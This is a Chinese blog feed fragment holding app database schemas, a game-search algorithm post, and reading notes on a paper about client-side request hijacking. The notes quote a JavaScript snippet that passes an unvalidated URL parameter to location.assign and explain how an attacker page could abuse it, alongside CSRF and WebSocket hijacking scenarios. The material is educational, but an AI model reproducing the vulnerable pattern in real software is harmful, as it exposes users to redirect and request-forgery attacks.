title="用户表"></a>用户表</h5><table><thead><tr><th><strong>变量</strong></th><th><strong>描述</strong></th><th><strong>数据类型</strong></th></tr></thead><tbody><tr><td>username</td><td>用户名</td><td>string</td></tr><tr><td>passwd</td><td>用户密码</td><td>string</td></tr><tr><td>id</td><td>主键</td><td>long</td></tr><tr><td>actList</td><td>用户活动日程&lt;aid,actiName&gt;</td><td>JSON&lt;String,String&gt;</td></tr><tr><td>phoneNumber</td><td>手机号</td><td>string</td></tr><tr><td>email</td><td>邮箱</td><td>mail</td></tr><tr><td>role</td><td>系统管理员</td><td>bool</td></tr><tr><td>wantJoinActList</td><td>用户想要参与的活动列表&lt;aid,reason&gt;,还没审核通过的参与申请</td><td>JSON&lt;String,String&gt;</td></tr></tbody></table><h5 id="活动表"><a href="#活动表" class="headerlink" title="活动表"></a>活动表</h5><table><thead><tr><th><strong>变量</strong></th><th><strong>描述</strong></th><th><strong>数据类型</strong></th></tr></thead><tbody><tr><td>id</td><td>主键</td><td>long</td></tr><tr><td>actName</td><td>活动名</td><td>string</td></tr><tr><td>userList</td><td>参与者及其身份&lt;uid,role&gt;</td><td>JSON&lt;String,int&gt;</td></tr><tr><td>actDescription</td><td>活动描述</td><td>string</td></tr><tr><td>status</td><td>活动进度</td><td>int</td></tr><tr><td>beginTime</td><td>开始时间</td><td>timestamp</td></tr><tr><td>endTime</td><td>结束时间</td><td>timestamp</td></tr><tr><td>totalBudget</td><td>预算</td><td>double</td></tr><tr><td>userCost</td><td>参与者开销</td><td>JSON&lt;String,double&gt;</td></tr><tr><td>userGroup</td><td>用户分组列表&lt;uid,group&gt;</td><td>JSON&lt;String,String&gt;</td></tr><tr><td>place</td><td>地点</td><td>String</td></tr><tr><td>resource</td><td>其他资源&lt;rid,quantity&gt;</td><td>JSON&lt;String,int&gt;</td></tr><tr><td>roleList</td><td>身份数量列表&lt;role,quantity&gt;</td><td>JSON&lt;String,int&gt;</td></tr><tr><td>rankList</td><td>用户对活动评分列表&lt;uid,rank&gt;</td><td>JSON&lt;String,int&gt;</td></tr><tr><td>unCheckedUserList</td><td>待审核的用户列表&lt;uid,reason&gt;</td><td>JSON&lt;String,String&gt;</td></tr><tr><td>score</td><td>用户平均评分</td><td>double</td></tr><tr><td>ifFileStore</td><td>表示该活动是否提供文件上传的功能</td><td>bool</td></tr><tr><td>actStatus</td><td>活动内部细节流程&lt;StatusName,流程排序int&gt;</td><td>JSON&lt;String,int&gt;</td></tr><tr><td>message</td><td>聊天消息&lt;timestamp,”uid:context”&gt;</td><td>JSON&lt;String,String&gt;</td></tr><tr><td>checkResult</td><td>活动审核结果</td><td>String</td></tr></tbody></table><h5 id="资源表"><a href="#资源表" class="headerlink" title="资源表"></a>资源表</h5><table><thead><tr><th><strong>变量</strong></th><th><strong>描述</strong></th><th><strong>数据类型</strong></th></tr></thead><tbody><tr><td>id</td><td>主键</td><td>long</td></tr><tr><td>resourceName</td><td>资源名</td><td>string</td></tr><tr><td>type</td><td>资源类型（区分物品&#x2F;地点）</td><td>int</td></tr><tr><td>quantity</td><td>资源数量</td><td>int</td></tr></tbody></table><h5 id="通知表"><a href="#通知表" class="headerlink" title="通知表"></a>通知表</h5><table><thead><tr><th><strong>变量</strong></th><th><strong>描述</strong></th><th><strong>数据类型</strong></th></tr></thead><tbody><tr><td>id</td><td>主键</td><td>long</td></tr><tr><td>aid</td><td>关联活动id</td><td>long</td></tr><tr><td>sendUid</td><td>发送者用户id</td><td>long</td></tr><tr><td>receiveUid</td><td>接收者id</td><td>long</td></tr><tr><td>content</td><td>内容</td><td>String</td></tr><tr><td>type</td><td>通知模板</td><td>int</td></tr><tr><td>groupId</td><td>同一批次通知的id，便于合并相同内容的通知</td><td>String</td></tr><tr><td>ifRead</td><td>是否已读</td><td>boolean</td></tr></tbody></table><h5 id="文件表"><a href="#文件表" class="headerlink" title="文件表"></a>文件表</h5><table><thead><tr><th><strong>变量</strong></th><th><strong>描述</strong></th><th><strong>数据类型</strong></th></tr></thead><tbody><tr><td>fid</td><td>文件主键</td><td>long</td></tr><tr><td>aid</td><td>关联活动id</td><td>long</td></tr><tr><td>fileName</td><td>文件名</td><td>VARCHAR</td></tr><tr><td>hashName</td><td>存储时的hash</td><td>VARCHAR</td></tr><tr><td>timing</td><td>hash时用的时间戳</td><td>VARCHAR</td></tr><tr><td>downloadTimes</td><td>下载次数</td><td>int</td></tr><tr><td>uploadDate</td><td>文件上传时间戳</td><td>timestamp</td></tr><tr><td>uid</td><td>上传者uid</td><td>long</td></tr></tbody></table><h5 id="报销单表"><a href="#报销单表" class="headerlink" title="报销单表"></a>报销单表</h5><table><thead><tr><th><strong>变量</strong></th><th><strong>描述</strong></th><th><strong>数据类型</strong></th></tr></thead><tbody><tr><td>id</td><td>报销单主键</td><td>long</td></tr><tr><td>aid</td><td>关联活动id</td><td>long</td></tr><tr><td>uid</td><td>报销单提交用户uid</td><td>long</td></tr><tr><td>cost</td><td>花销</td><td>double</td></tr><tr><td>content</td><td>报销内容陈述</td><td>VARCHAR</td></tr><tr><td>status</td><td>审核状态</td><td>int</td></tr></tbody></table><h5 id="提醒表"><a href="#提醒表" class="headerlink" title="提醒表"></a>提醒表</h5><table><thead><tr><th><strong>变量</strong></th><th><strong>描述</strong></th><th><strong>数据类型</strong></th></tr></thead><tbody><tr><td>id</td><td>提醒表主键</td><td>long</td></tr><tr><td>uid</td><td>提醒设置提交用户uid</td><td>long</td></tr><tr><td>reminderTime</td><td>提醒时间</td><td>timestamp</td></tr><tr><td>content</td><td>提醒内容</td><td>VARCHAR</td></tr></tbody></table><h5 id="评论表"><a href="#评论表" class="headerlink" title="评论表"></a>评论表</h5><table><thead><tr><th><strong>变量</strong></th><th><strong>描述</strong></th><th>数据类型</th></tr></thead><tbody><tr><td>id</td><td>评论表主键</td><td>long</td></tr><tr><td>uid</td><td>评论提交用户uid</td><td>long</td></tr><tr><td>aid</td><td>归属哪个活动</td><td>long</td></tr><tr><td>commentTime</td><td>评论时间</td><td>timestamp</td></tr><tr><td>content</td><td>评论内容</td><td>varchar</td></tr><tr><td>likes</td><td>评论点赞数</td><td>int</td></tr><tr><td>likeUserList</td><td>对这条评论点赞的用户</td><td>JSON</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>软件工程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>点格棋博弈程序编写</title>
    <link href="/2024/04/24/%E5%8D%9A%E5%BC%88%E7%A8%8B%E5%BA%8F%E7%BC%96%E5%86%99/"/>
    <url>/2024/04/24/%E5%8D%9A%E5%BC%88%E7%A8%8B%E5%BA%8F%E7%BC%96%E5%86%99/</url>
    
    <content type="html"><![CDATA[<p>乱七八糟地写一些博弈算法吧。</p><span id="more"></span><h3 id="主函数"><a href="#主函数" class="headerlink" title="主函数"></a>主函数</h3><p>这个函数是博弈引擎与平台进行通信交互的主函数，具体逻辑如下：</p><p><img src="D:\0-MyBlog\hexo-blog\source_posts\博弈程序编写\Snipaste_2024-04-28_21-56-35.png"></p><h3 id="alpha-beta剪枝"><a href="#alpha-beta剪枝" class="headerlink" title="alpha&amp;beta剪枝"></a>alpha&amp;beta剪枝</h3><p>树结构定义：</p><p>每个节点表示此时的赢面</p><p>根节点表示我方赢面</p><p>父节点到子节点表示执棋方落子一步，故以我方为根节点，则奇数层为我方赢面，偶数层为敌方赢面</p><p>搜索深度就是树的深度</p><p>最大最小算法：</p><p>​根据树结构定义，我们显然要在奇数层获取最大赢面，对手会在偶数层使得我们走向最小赢面。故我们在偶数层填入子节点中的最小值，称为MIN节点，在奇数层填写子节点中的最大值，称为MAX节点。</p><p>剪枝：</p><p>​上述算法需要遍历整个博弈树，我们发现在遍历博弈树的过程中，我们的赢面情况是在不断变化的，所以我们可以记录当前赢面的范围，从而规避掉不必要的搜索路径。<code>alpha</code>表示此时可以获得的最大赢面，<code>beta</code>表示此时我方受到敌方行棋限制（根据先前的搜索结果敌方可以导向我方选择路径）后可以获得的最大赢面，当<code>alpha</code>大于等于<code>beta</code>时，剪掉后续路径。<br>$$<br>alpha&lt;&#x3D;score&lt;&#x3D;beta<br>$$<br>回溯过程中存在三种状态：</p><ol><li>初始状态：通过父节点向下传递<code>alpha</code>和<code>beta</code>的值</li><li>左子树回溯结果：如果是MAX节点，则更改<code>alpha</code>的值，需要满足值大于原<code>alpha</code>，否则不用更改；如果是MIN节点，则更改<code>beta</code>的值，需要满足值小于原<code>beta</code>，否则不用更改</li><li>回溯结果：即右子树回溯，</li></ol><p><img src="D:\0-MyBlog\hexo-blog\source_posts\博弈程序编写\Snipaste_2024-05-16_17-35-06.png"></p><h3 id="蒙特卡洛树搜索"><a href="#蒙特卡洛树搜索" class="headerlink" title="蒙特卡洛树搜索"></a>蒙特卡洛树搜索</h3><h3 id="点格棋代码实现"><a href="#点格棋代码实现" class="headerlink" title="点格棋代码实现"></a>点格棋代码实现</h3><h4 id="主要行棋逻辑"><a href="#主要行棋逻辑" class="headerlink" title="主要行棋逻辑"></a>主要行棋逻辑</h4><p><code>MyMove()</code>函数主要是清理当前棋局，并产生走法，然后调用评估函数得到评分最大的走法</p><p><img src="D:\0-MyBlog\hexo-blog\source_posts\博弈程序编写\Snipaste_2024-06-09_15-06-01.png"></p><h4 id="评估函数"><a href="#评估函数" class="headerlink" title="评估函数"></a>评估函数</h4><p>主要使用极大极小搜索，以及使用α&amp;β剪枝算法剪枝</p><p><img src="D:\0-MyBlog\hexo-blog\source_posts\博弈程序编写\Snipaste_2024-06-09_16-11-01.png"></p>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>算法</tag>
      
      <tag>博弈</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>论文阅读1</title>
    <link href="/2024/04/17/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB1/"/>
    <url>/2024/04/17/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB1/</url>
    
    <content type="html"><![CDATA[<p>大三某课程作业🐸读一篇网安相关文章。选取到了S&amp;P’2024中的</p><p><code>The Great Request Robbery: An Empirical Study of Client-side Request Hijacking Vulnerabilities on the Web</code></p><span id="more"></span><p>伟大的请求劫持：对网络客户端请求劫持漏洞的实证研究</p><p>关于为什么这里使用请求劫持这个词而不是伪造，个人分析，伪造是手段，目的是为了达到劫持这种状态，想一想，攻击者能够伪造受害者发出请求，怎么不算劫持了受害者的请求呢。</p><h3 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h3><h4 id="原文翻译"><a href="#原文翻译" class="headerlink" title="原文翻译"></a>原文翻译</h4><p>​请求伪造攻击是<code>Web</code>应用程序最古老的威胁之一，传统上是由服务器端混淆的代理漏洞引起的。然而，最近客户端技术的进步引入了更微妙的请求伪造变种，攻击者利用客户端程序中的输入验证缺陷来劫持发出请求。我们几乎没有关于这些客户端变体的信息，它们的流行程度，影响和对策，在本文中，我们对Web平台上客户端请求劫持的状态进行了第一次评估。</p><p>​从全面审查浏览器<code>API</code>功能和<code>Web</code>规范开始，我们将请求劫持漏洞和由此导致的攻击系统化，确定了10个不同的漏洞变体，其中包括7个新的漏洞。然后，我们使用我们的系统设计和实现了<code>Sheriff</code>，一个静态-动态工具，用于检测从攻击者可控输入到请求发送指令的脆弱数据流。</p><p>​我们在Tranco Top  10K网站的顶部实例化了<code>Sheriff</code>，据我们所知，这是对野外普遍存在的请求劫持缺陷的首次调查。我们的研究发现，请求劫持漏洞无处不在，影响了9.6 %的前10K站点。我们通过在49个站点上构建67个概念验证漏洞，展示了这些漏洞的影响，使得针对Microsoft  Azure、Starz、Reddit和Indeed等流行网站的任意代码执行、信息泄露、开放重定向和CSRF成为可能。最后，我们回顾和评估了针对客户端请求劫持攻击的现有对策的采用和有效性，包括基于浏览器的解决方案，如<code>CSP</code>，<code>COOP</code>和<code>COEP</code>，以及输入验证。</p><h4 id="重要信息"><a href="#重要信息" class="headerlink" title="重要信息"></a>重要信息</h4><p>​近几年出现了很多最新的请求劫持的攻击模式，目前还没有对这些方法的系统性研究。通过审查浏览器<code>API</code>功能和Web规范，我们将请求劫持攻击重新分为10类，包括新的7个漏洞。我们开发了<code>Sheriff</code>工具，用于检测网站是否存在请求劫持漏洞，这是对在野请求劫持漏洞的首次调查。通过工具扫描大量站点发现，请求劫持漏洞无处不在。最后，我们评估了现有防御措施的有效性。</p><h3 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h3><h4 id="重要信息-1"><a href="#重要信息-1" class="headerlink" title="重要信息"></a>重要信息</h4><p>​主要介绍了传统请求劫持造成的危害，比如客户端代码执行、混淆请求、删除数据库等等。</p><p>​最近客户端技术的快速演进引入了更隐蔽的请求伪造漏洞变种，攻击者不再依赖混淆的代理缺陷，而是利用客户端<code>JavaScript</code>程序中的输入验证漏洞来劫持外出请求。目前的研究主要集中在<code>CSRF</code>及相应的检测分析技术。但是不仅仅是<code>CSRF</code>攻击需要被研究，它仅仅是较大的一个版块，还有许多存在于<code>JS</code>代码中的请求可以被劫持。</p><p>​同样的，最近的研究主要是关注到异步请求，像<code>XMLHttpRequest</code>和<code>Fetch API</code>，忽略了其他类型的请求诸如<code>push notification</code>、<code>web sockets</code>等等。再者，目前的防御策略只解决了混淆代理问题，但新的客户端输入缺陷导致的请求劫持将会绕过目前的防御手段。</p><p>​在本文中，我们首次对客户端请求劫持漏洞进行了评估，主要包括三个方面：对攻击面的系统探索，对脆弱网站的测量，以及对请求劫持防御的全面审查和评估。然后，我们提出了<code>Sheriff</code>，这是一种客户端请求劫持检测工具，它结合使用混合程序分析和浏览器内动态污点跟踪来发现潜在脆弱的数据流并进行动态分析用于自动漏洞验证的<code>API</code>工具。</p><h4 id="重要名词简介"><a href="#重要名词简介" class="headerlink" title="重要名词简介"></a>重要名词简介</h4><p><code>fetch</code>：JS中的函数，用于向服务端请求资源。子请求受到浏览器的同源策略和其他安全限制的保护，因为它们是在同一页面上执行的。</p><p><code>XMLHttpRequest</code>：一个内建的浏览器对象，它允许使用 JavaScript 发送 HTTP 请求。两种执行模式：同步（synchronous）和异步（asynchronous）。子请求受到浏览器的同源策略和其他安全限制的保护，因为它们是在同一页面上执行的。</p><p><code>Top-level Request</code>：顶级请求是指在浏览器中执行的导航请求，例如使用<code>location.assign()</code>、<code>window.open()</code>或通过用户在地址栏中输入URL来导航到新页面的请求。在顶级请求中，<strong>浏览器会将当前域下的Cookie发送到目标域</strong>。这可能会引发安全问题，特别是如果目标域是恶意站点，它可能会收集和滥用来自其他域的Cookie信息。</p><h3 id="CSRH：Client-side-Request-Hijacking"><a href="#CSRH：Client-side-Request-Hijacking" class="headerlink" title="CSRH：Client-side Request Hijacking"></a>CSRH：Client-side Request Hijacking</h3><h4 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>CSRH漏洞描述：攻击者可以欺骗受害者的客户端使用攻击者自制的输入来操作发送请求的API。比较出名的漏洞实例像是CSRF这种。</p><p>在Microsoft Azure网页中发现的一个可以被劫持的top-level HTTP请求</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> params = (<span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(<span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>)).<span class="hljs-property">searchParams</span>;<br><span class="hljs-keyword">var</span> t = params.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;request&quot;</span>);<br><span class="hljs-keyword">if</span>(t != <span class="hljs-literal">null</span> &amp;&amp; t.<span class="hljs-property">length</span>)&#123; <br>    <span class="hljs-comment">// post message to opener</span><br>    opener &amp;&amp; opener.<span class="hljs-title function_">postMessage</span>(<span class="hljs-string">&quot;reauthPopupOpened&quot;</span>, t);<br>    <span class="hljs-comment">// listen for signal</span><br>    <span class="hljs-variable language_">window</span>.<span class="hljs-property">onmessage</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-keyword">if</span> (event.<span class="hljs-property">origin</span> !== opener.<span class="hljs-property">origin</span>) <span class="hljs-keyword">return</span>;<br>        <span class="hljs-keyword">if</span> (event.<span class="hljs-property">data</span> === <span class="hljs-string">&quot;sendRequest&quot;</span>)&#123; <br>            <span class="hljs-comment">// top-level navigation request </span><br>            <span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span>.<span class="hljs-title function_">assign</span>(t);<br>        &#125; <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="威胁模型"><a href="#威胁模型" class="headerlink" title="威胁模型"></a>威胁模型</h4><p><img src="/2024/04/17/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB1/Snipaste_2024-04-21_10-19-56.png"></p><p>上述漏洞的利用实例：</p><p><img src="/2024/04/17/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB1/Snipaste_2024-04-18_16-09-53.png"></p><p>攻击者准备了一个恶意页面并诱导受害者去访问（或者直接分享给受害者存在漏洞的页面，个人觉得这个不如前面那个方法，前面那个方法可以隐藏恶意<code>payload</code>），这个页面会打开存在漏洞的页面，并且此时已经插入了恶意的请求参数，当新的页面加载完成时，上面那段JS代码会加载恶意参数并发出<code>top-level</code>请求，由于是顶级请求，浏览器会获取<code>cookie</code>，从而绕过同源策略，劫持原始请求。</p><p>在这篇文章中，研究者们不仅仅关注http形式的URL，例如像<code>location.assign()</code>这种API也可以接收URL。劫持了<code>API</code>后，攻击者将会扩大危害，例如<code>CSRF</code>、客户端代码执行、重定向等等</p><h3 id="问题陈述——即本篇论文解决的问题"><a href="#问题陈述——即本篇论文解决的问题" class="headerlink" title="问题陈述——即本篇论文解决的问题"></a>问题陈述——即本篇论文解决的问题</h3><h4 id="RQ1：浏览器功能带来的攻击系统化分析"><a href="#RQ1：浏览器功能带来的攻击系统化分析" class="headerlink" title="RQ1：浏览器功能带来的攻击系统化分析"></a>RQ1：浏览器功能带来的攻击系统化分析</h4><p>​我们研究用于发送请求的各种浏览器方法和 API，并用特定功能标记每个方法和 API（例如，接受 javascript URI、允许设置请求正文等）。然后，我们回顾现有文献并进行全面的威胁建模分析，系统地评估攻击者可以操纵请求发送 API 的各个领域时出现的安全风险。</p><h4 id="RQ2：漏洞检测、漏洞存在率及其危害"><a href="#RQ2：漏洞检测、漏洞存在率及其危害" class="headerlink" title="RQ2：漏洞检测、漏洞存在率及其危害"></a>RQ2：漏洞检测、漏洞存在率及其危害</h4><p>毫无疑问可以推出，我们对真实网站中请求劫持这一更广泛问题的总体影响和普遍性几乎没有任何信息。</p><p>在本文中，我们的目标是通过量化野外请求劫持的普遍程度、识别易受攻击的行为并调查其影响来填补这一空白，以深入了解影响 Web 应用程序安全状况的根本问题和因素。</p><h4 id="RQ3：防护措施及其有效性"><a href="#RQ3：防护措施及其有效性" class="headerlink" title="RQ3：防护措施及其有效性"></a>RQ3：防护措施及其有效性</h4><p>当前许多研究的重点只是利用混淆代理缺陷的传统请求伪造攻击，因此，我们仍然缺乏对各种防御机制针对请求劫持客户端变体保护范围的全面了解。</p><h3 id="API功能带来的攻击的系统化分析——对RQ1的讨论"><a href="#API功能带来的攻击的系统化分析——对RQ1的讨论" class="headerlink" title="API功能带来的攻击的系统化分析——对RQ1的讨论"></a>API功能带来的攻击的系统化分析——对RQ1的讨论</h3><h4 id="浏览器API功能"><a href="#浏览器API功能" class="headerlink" title="浏览器API功能"></a>浏览器API功能</h4><p>本文的研究者们从<code>WHATWG </code>和<code>W3C</code>的存储库中进行了系统性的搜索，重点搜索了其中能创建网络请求的JS <code>API</code>，最后选出了6大类一共10个<code>API</code>。这些<code>API</code>都有不同的特点，并默认受到某些约束，例如同源策略。<strong>研究者们认为，加入CSP、COOP等额外策略并不能影响到底层软件的缺陷。</strong>在本节，本文的研究者们聚焦在这些默认受到约束的<code>API</code>，希望发现默认设置下的可能攻击方式。</p><p>研究者们探索出来的10种<code>API</code>：</p><p><img src="/2024/04/17/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB1/Snipaste_2024-04-18_21-25-53.png"></p><h4 id="CSRH攻击的系统分析"><a href="#CSRH攻击的系统分析" class="headerlink" title="CSRH攻击的系统分析"></a>CSRH攻击的系统分析</h4><p><strong>基于第2.2节的威胁模型：攻击者可以控制4.1节中提出的API发出的网络请求中的URL（在这里可以认为是请求头和请求体）</strong></p><p>本文的研究者通过系统地分析前人的资料，并检验了那些由于攻击者能够操纵每个发送请求<code>API</code>的不同字段所带来的潜在攻击。结果发现了一共10种CSRH攻击变体，并且其中只有3种被熟知。</p><p><img src="/2024/04/17/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB1/Snipaste_2024-04-21_11-31-49.png"></p><p><strong>以下列出几种脆弱的API及其存在风险：</strong></p><p>​<strong>异步请求(Asynchronous Requests)：</strong></p><p>​像<code>XMLHttpRequest</code>或者低层次<code>fetch</code>这种没有造成顶层页面重载的异步请求都被常用于和web服务通信。攻击者操纵URL、body和header等等都能导致客户端出现不可控的行为，代表就是CSRF攻击。这种攻击方式可以产生信息泄露，攻击者将受害者的敏感信息如登录凭证包含在请求体中，发送到有害的主机。</p><p><img src="/2024/04/17/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB1/Snipaste_2024-04-18_22-12-33.png"></p><p>​<strong>推送请求(Push Request)：</strong></p><p>​Web Push API是一种用于实现推送通知功能的Web标准API。它允许网站向用户的设备（如桌面浏览器或移动设备）发送实时通知，即使用户当前没有打开该网站。当推送订阅没有做好CSRF防护时，会产生CSRF攻击。</p><p>​服务工作者是一个JavaScript脚本，运行在浏览器的后台，独立于网页。它充当推送通知的中间人，处理接收到的推送消息并显示通知。</p><p>参考<a href="https://m.freebuf.com/vuls/200711.html?utm_source=joyk.com&utm_medium=referral&hmsr=joyk.com">谷歌推送接口劫持实例</a>，没有做好CSRF防御的PushRequest接口导致的经典CSRF攻击，从而造成用户信息泄露。攻击手段我画了下面这张图：</p><p><img src="/2024/04/17/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB1/Snipaste_2024-04-19_13-38-39.png"></p><p>关于论文中提到的推送API造成的客户端DOS，我没有发现公开的实例，只能作出下面的猜测：攻击者通过某种手段获取到了用户在某网站的cookie后，通过模拟sw.js请求，请求大量推送，从而对目标浏览器造成DOS攻击。</p><p>​<strong>服务端发送事件(Server-Sent Events)：</strong></p><p>​<code>SSE</code>是一种服务端向浏览器推送消息的单向通信机制，而<code>Push Request API</code>则是一种允许客户端发起请求并接收服务器推送消息的双向通信机制。</p><p>​原文中说攻击者操纵参数就可以实现劫持，这里没有看到合适的实例或者更清晰的解释。好像国内外对此研究或者攻击都比较少。先放在这里。</p><p>​<strong>Web Sockets：</strong></p><p>​<code>WebSocket</code>是一种在Web应用程序中实现双向通信的协议和<code>API</code>。它提供了一种持久化的连接，允许服务器和客户端之间进行实时的双向数据传输。<code>WebSocket</code>通过建立一条持久化的连接，避免了每次通信都需要创建新的HTTP请求的开销。一旦连接建立，服务器和客户端之间可以长时间保持连接状态，实现实时通信。</p><p>​<code>WebSocket</code>和<code>HTTP</code>的区别：大多数的Web浏览器和Web网站都是使用HTTP协议进行通信的。通过HTTP协议，客户端发送一个HTTP请求，然后服务器返回一个响应。通常来说，服务端返回一个响应后，这个HTTP请求事务就已经完成了。即使这个HTTP连接处于<code>keep-alive</code>的状态，它们之间的每一个工作(事务)依然是请求与响应，请求来了，响应回去了。这个事务就结束了。所以通常来说，HTTP协议是一个基于事务性的通信协议。</p><p>​而<code>WebSocket</code>呢，它通常是由HTTP请求发起建立的，建立连接后，会始终保持连接状态。客户端和服务端可以随时随地的通过一个<code>WebSocket</code>互发消息，没有所谓事务性的特点。这里要注意了，源于其双向全双工的通信特点，在一个<code>WebSocket</code>连接中，服务端是可以主动发送消息的哦，这一点已经完全区别于HTTP协议了。</p><p>​因此，基于以上特点，<code>WebSocket</code>通常用于低延迟和允许服务器发送消息的场景。例如，金融行业常用<code>WebSocket</code>来传输实时更新的数据</p><p>​这篇文章的研究者提出，攻击者在控制了<code>WebSocket</code>连接的情况下，可以作为中间人，连接受害者和目标服务器。</p><p>参考<a href="https://cloud.tencent.com/developer/article/1423227">利用CSWH漏洞实现用户密码重置实例</a>，没有做好CSRF防御导致的攻击。攻击手段我画了下面这张图：</p><p><img src="/2024/04/17/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB1/Snipaste_2024-04-21_11-28-40.png"></p><p>​<strong>顶级导航请求(Top-Level Navigation Requests)：</strong></p><p>​前面的案例已经研究过了，浏览器的顶层API导致重定向到恶意页面。</p><p>​<strong>窗口导航请求(Window Navigation Requests)：</strong></p><p>​类似<code>location API</code>，前面已经分析过了。</p><h4 id="不同API的流行程度"><a href="#不同API的流行程度" class="headerlink" title="不同API的流行程度"></a>不同API的流行程度</h4><p>​研究者发现 9,901 个域至少包含一个与客户端请求相关的 API，在约 100 万个网页中总共有约 790 万次 API 调用。通过<code>location.href</code>的顶级导航请求最为普遍，出现在超过 8K 的网站上。通过<code>XMLHttpRequest API</code>的异步请求使用最广泛，在超过 400K 的页面上有近 300 万次调用。考虑我们提出的新漏洞变体，之前的研究工作中有超过 44.7% 的<code>API</code>调用忽略了请求劫持威胁。</p><h3 id="漏洞探测"><a href="#漏洞探测" class="headerlink" title="漏洞探测"></a>漏洞探测</h3><p>本文的研究者们开发出了一款动静态结合分析工具<code>Sheriff</code>，其主要基于4个主要部分：</p><ul><li>数据收集模块：从网页收集<code>Web</code>资源和动态污点流</li><li>数据建模模块：通过处理数据识别和建模独特的网页，并为其创建属性图</li><li>漏洞分析模块：</li><li>动态验证模块</li></ul><p><img src="/2024/04/17/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB1/Snipaste_2024-04-19_19-40-59.png"></p><h4 id="数据收集"><a href="#数据收集" class="headerlink" title="数据收集"></a>数据收集</h4><p>本文的研究者们表示，数据收集的第一步是收集客户端的代码和运行时的参数值(比如<code>DOM</code>快照)。研究者基于<code>playwright</code>、<code>Foxhound</code>和<code>Firefox Devtools</code>开发了一个污点感知爬虫。同时由于<code>Foxhound</code>不支持所有的测试API，研究者们自己开发了支持，称为<code>Foxhound+</code>。</p><p>这个爬虫采用深度优先搜索的方式，对于一个输入，会爬取这个页面中的所有<code>URL</code>，然后爬取新<code>URL</code>中的所有<code>URL</code>，上限为200个。</p><p>在访问过程中，爬虫会收集以下信息：网页资源（例如脚本）、DOM快照、全局对象的属性、事件跟踪、网络请求和响应，以及从程序输入到安全敏感指令（例如请求）的动态污点流。</p><p>这个爬虫不会创建帐户或登录，因为手动创建和维护注册和登录脚本既脆弱又具有挑战性，特别是在处理数千个应用程序时。此限制符合大规模安全测试的最新技术，比如文章<a href="https://swag.cispa.saarland/papers/klein2022hand.pdf">S&amp;P2022</a>中也是如此。</p><p><img src="/2024/04/17/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB1/Snipaste_2024-04-21_13-34-31.png"></p><p><code>Playwright</code>是一个开源的自动化测试工具,用于测试网页应用。它可以操控<code>Chromium</code>(用于<code>Chrome</code>、<code>Edge</code>等)、<code>Firefox</code>和<code>WebKit</code>(用于<code>Safari</code>)等主流浏览器,使我们能在不同浏览器中执行自动化测试。<code>Playwright</code>通过直接控制浏览器引擎(如<code>Chromium</code>和<code>Firefox</code>)来执行测试,而不是通过浏览器界面。这意味着<code>Playwright</code>可以直接操控浏览器引擎,执行更快速和稳定的测试。<code>Playwright</code>使用浏览器引擎自带的<code>JavaScript</code>执行环境和<code>Web API</code>来控制浏览器。</p><p>这个脚本会打开<code>Chromium</code>浏览器,访问<code>example.com</code>网站,获取网页标题并打印,最后关闭浏览器。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> playwright.sync_api <span class="hljs-keyword">import</span> sync_playwright<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">playwright</span>):<br>    chromium = playwright.chromium<br>    browser = chromium.launch()<br>    page = browser.new_page()<br>    page.goto(<span class="hljs-string">&quot;https://www.example.com/&quot;</span>)<br>    title = page.title()<br>    <span class="hljs-built_in">print</span>(title)<br>    browser.close()<br><br><span class="hljs-keyword">with</span> sync_playwright() <span class="hljs-keyword">as</span> playwright:<br>    run(playwright)<br></code></pre></td></tr></table></figure><p><code>Foxhound</code>：一个在<code>Javascript</code>引擎和<code>DOM</code>中启用动态数据流跟踪的 Web 浏览器，基于<code>Mozilla Firefox</code>，它可用于识别客户端 Web 应用程序中不安全的数据流或数据隐私泄漏。</p><p><a href="https://github.com/SAP/project-foxhound">Foxhound</a></p><h4 id="数据建模"><a href="#数据建模" class="headerlink" 